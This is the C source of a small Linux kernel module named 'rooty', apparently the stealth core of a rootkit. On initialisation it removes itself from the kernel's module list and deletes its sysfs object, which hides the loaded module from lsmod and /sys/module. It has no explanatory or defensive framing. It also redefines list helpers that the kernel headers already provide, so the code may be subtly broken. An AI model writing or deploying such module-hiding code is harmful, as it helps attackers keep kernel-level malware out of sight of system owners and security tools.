#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

  static inline void __list_del(struct list_head * prev, struct list_head * next)
  {
  next->prev = prev;
  prev->next = next;
  }
  
  static inline void INIT_LIST_HEAD(struct list_head *list)
  {
  list->next = list;
  list->prev = list;
  }

int rooty_init(void) {
  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  
 printk("rooty: module loaded\n");
 return 0;
}

void rooty_exit(void) {
 printk("rooty: module removed\n");
}
